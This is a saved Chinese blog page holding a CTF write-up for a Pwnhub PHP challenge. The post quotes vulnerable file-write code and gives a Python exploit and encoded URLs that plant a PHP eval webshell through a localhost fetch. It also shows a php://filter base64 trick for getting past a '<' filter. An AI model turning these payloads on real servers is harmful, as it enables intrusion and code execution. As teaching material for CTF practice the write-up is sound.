@@ -1,0 +1,210 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园</title>
+<link href="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/Pwnhub_1th_Story_Writeup.html" id="cb_post_title_url">Pwnhub-胖哈勃外传-第一集-Writeup</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>看源代码里面有这样的一个链接。</p>
+<pre><code>http://54.223.231.220/image.php?file=http://127.0.0.1:8888/test.png&amp;path=logo.jpg</code></pre>
+<p>有点像第七届极客出的php is fun。</p>
+<p>极客php is fun的源码：</p>
+<pre><code>if (isset($_GET) &amp;&amp; !empty($_GET)) {
+    $url = $_GET['file'];
+    $path = "upload/" . $_GET['path'];
+} else {
+    show_source(__FILE__);
+    exit();
+}
+if (strpos($path, '..') &gt; -1) {
+    die('SYCwaf!');
+}
+if (strpos($url, 'http://127.0.0.1/') === 0) {
+    file_put_contents($path, file_get_contents($url));
+    echo "console.log($path update successed!)";
+} else {
+    echo "Hello.Geeker";
+}</code></pre>
+<p>但是此题image.php过滤了<code>&lt;</code>，这个就需要想办法怎么样去绕过了，另外生成的文件也会很快被删掉。</p>
+<p>本题核心是：</p>
+<pre><code>file_put_contents($path, file_get_contents($url));</code></pre>
+<p>只能访问127.0.0.1的话，其实也可以利用本地的80的网页内容，只要有一句话的内容就好了，然后就可以写入到文件。<br/>
+在这有一个网页内容的输入点:</p>
+<pre><code>http://54.223.231.220/?date/%3C?php%20eval($_GET[1]);?%3E/</code></pre>
+<p>所以可以把这个网页内容写入到一个php文件，即可以getshell</p>
+<p>exp.py</p>
+<pre><code>import requests
+
+u1 = "http://54.223.231.220/image.php?path=lemon.php&amp;file=http%3A%2F%2F127.0.0.1%3A8888%2F%3Fdate%2F%3C%3Fphp%2520eval(%24_GET%5B1%5D)%3B%3F%3E%2F"
+r = requests.get(u1)
+
+u2 = "http://54.223.231.220/lemon.php?1=var_dump(glob('*'));"
+r1 = requests.get(u2)
+print r1.content
+
+u2 = "http://54.223.231.220/lemon.php?1=echo%20file_get_contents('flag.php');"
+r1 = requests.get(u2)
+print r1.content</code></pre>
+<p>flag:</p>
+<pre><code>pwnhub{flag:kukukuxia今天胖哈勃跑偏了%&amp;^%&amp;^}</code></pre>
+<hr/>
+<p>另外如果没有那个输入页面到话，其实image.php本身也是可以有输入点可控的。虽然过滤了<code>&lt;</code></p>
+<pre><code>echo "console.log($path update successed!)";</code></pre>
+<p><img src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/804631-20161215145856886-230418787.png"/></p>
+<p>所以完全可以把这个页面的内容作为写入文件的内容，感觉会有点绕，而且要注意url编码问题。</p>
+<pre><code>http://54.223.231.220/image.php?file=http%3A%2F%2F127.0.0.1%3A8888%2Fimage.php%3Ffile%3Dhttp%3A%2F%2F127.0.0.1%3A8888%2Fimage.php%26path%3D%3Fphp%2520eval(%24_POST%5B1%5D)%3B%3F%3E&amp;path=1.php</code></pre>
+<p><img src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/804631-20161215150329417-252774173.png"/></p>
+<p>现在内容可以写入一句话了，但是最大的问题就是<code>&lt;</code>不能出现。</p>
+<p>在解决死亡exit、die的时候，会用上php协议的过滤器。在这也是可以用上的。</p>
+<pre><code>php://filter/write=convert.base64-decode=lemon.php</code></pre>
+<p>对写入的内容进行base64解码再写入文件。</p>
+<pre><code>http://54.223.231.220/image.php?file=http://127.0.0.1:8888/image.php&amp;path=PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h</code></pre>
+<p>构造出利用：</p>
+<pre><code>http://54.223.231.220/image.php?file=http%3A%2F%2F127.0.0.1%3A8888%2Fimage.php%3Ffile%3Dhttp%3A%2F%2F127.0.0.1%3A8888%2Fimage.php%26path%3DxxPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5h&amp;path=php://filter/write=convert.base64-decode/resource=2.php</code></pre>
+<p><img src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/804631-20161215151854886-1032073743.png"/></p>
+<p>其中要注意的是bae64解码的时候字符长度问题，以免解码导致一句话失效。</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2016-12-15 15:21</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6183411" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6183411);return false;">收藏</a></div>
+</div>
+<script src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6183411,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2016/12/15 15:21:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./Pwnhub-胖哈勃外传-第一集-Writeup - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
